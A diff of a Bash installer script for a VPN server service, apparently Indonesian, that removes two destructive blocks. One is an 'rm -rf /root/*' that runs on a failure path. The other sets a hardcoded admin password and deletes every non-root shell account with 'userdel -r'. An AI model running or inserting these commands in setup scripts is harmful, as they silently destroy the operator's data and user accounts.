@@ -27,7 +27,6 @@ echo -e "  \033[96m🌍 Telegram: https://nevpn.site\033[0m"
 echo -e "  \033[96m📱 WhatsApp: https://whatsapp.nevpn.site\033[0m"
 echo -e ""
 echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-rm -rf /root/*
 exit 1
 	fi
 check_and_install_gawk() {
@@ -95,16 +94,6 @@ fi
 echo -e " [INFO] Fetching server date..."
 dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
 biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
-pwadm="Kedaivpn"
-allowed_users=("root")
-all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
-for user in $all_users; do
-    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
-        userdel -r "$user" > /dev/null 2>&1
-        echo "User $user telah dihapus."
-    fi
-done
-
 FILE_WARNA="/etc/warna"
 
 if [ ! -f "$FILE_WARNA" ] || [ ! -s "$FILE_WARNA" ]; then
